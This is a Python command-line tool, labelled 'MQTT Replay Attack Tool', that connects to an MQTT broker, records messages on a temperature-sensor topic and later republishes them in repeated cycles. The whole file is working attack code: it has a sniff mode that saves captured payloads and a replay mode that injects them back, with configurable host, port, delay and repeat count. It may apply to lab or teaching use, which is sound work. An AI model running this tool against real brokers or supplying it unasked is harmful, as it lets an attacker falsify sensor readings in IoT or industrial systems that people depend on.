import paho.mqtt.client as mqtt
import json
import time
import argparse
from datetime import datetime
BROKER_HOST = "192.168.0.156"
BROKER_PORT = 1883
TOPIC = "sensors/temperature"
captured_messages = []
def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode('utf-8')
        data = json.loads(payload)
        captured_messages.append({
            "payload": payload,
            "timestamp": data.get("timestamp", time.time()),
            "original_time": time.time()
        })
        print(f"[CAPTURED] Seq:{data.get('sequence', '?')} | Temp:{data.get('temperature', '?')}°C")
    except Exception as e:
        print(f"[ERROR] Failed to parse message: {e}")
def set_broker_config(host, port):
    global BROKER_HOST, BROKER_PORT
    BROKER_HOST = host
    BROKER_PORT = port
def sniff_traffic(duration=30):
    print(f"Starting sniffing mode for {duration} seconds...")
    print(f"Connecting to {BROKER_HOST}:{BROKER_PORT}")
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "replay-sniffer")
    client.on_message = on_message
    client.connect(BROKER_HOST, BROKER_PORT)
    client.subscribe(TOPIC)
    client.loop_start()
    time.sleep(duration)
    client.loop_stop()
    client.disconnect()
    print(f"Sniffing complete. Captured {len(captured_messages)} messages.")
    return captured_messages
def replay_attack(messages, delay=2, repeat=3):
    print(f"Starting replay attack with {len(messages)} messages, delay={delay}s, repeat={repeat}")
    print(f"Connecting to {BROKER_HOST}:{BROKER_PORT}")
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "replay-attacker")
    client.connect(BROKER_HOST, BROKER_PORT)
    client.loop_start()
    for r in range(repeat):
        print(f"\nReplay cycle {r+1}/{repeat}")
        for i, msg in enumerate(messages):
            client.publish(TOPIC, msg["payload"])
            try:
                data = json.loads(msg["payload"])
                print(f"[REPLAYED] Cycle:{r+1} | Msg:{i+1} | Temp:{data.get('temperature', '?')}°C")
            except:
                print(f"[REPLAYED] Cycle:{r+1} | Msg:{i+1}")
            time.sleep(delay)
    client.loop_stop()
    client.disconnect()
    print("Replay attack completed")
def main():
    parser = argparse.ArgumentParser(description="MQTT Replay Attack Tool")
    parser.add_argument("--mode", choices=["sniff", "replay"], required=True,
                        help="Mode: sniff (capture traffic) or replay (send captured)")
    parser.add_argument("--duration", type=int, default=30,
                        help="Sniffing duration in seconds (default: 30)")
    parser.add_argument("--delay", type=int, default=2,
                        help="Delay between replayed messages in seconds (default: 2)")
    parser.add_argument("--repeat", type=int, default=3,
                        help="Number of replay cycles (default: 3)")
    parser.add_argument("--broker-host", default=BROKER_HOST, 
                        help="MQTT broker address (default: 192.168.0.156)")
    parser.add_argument("--broker-port", type=int, default=BROKER_PORT, 
                        help="MQTT broker port (default: 1883)")
    args = parser.parse_args()
    set_broker_config(args.broker_host, args.broker_port)
    if args.mode == "sniff":
        sniff_traffic(args.duration)
        with open("captured_messages.json", "w") as f:
            json.dump(captured_messages, f, indent=2)
        print("Captured messages saved to captured_messages.json")
    elif args.mode == "replay":
        try:
            with open("captured_messages.json", "r") as f:
                messages = json.load(f)
            replay_attack(messages, args.delay, args.repeat)
        except FileNotFoundError:
            print("[ERROR] captured_messages.json not found. Run sniff mode first.")
        except json.JSONDecodeError:
            print("[ERROR] captured_messages.json is corrupted.")

if __name__ == "__main__":
    main()
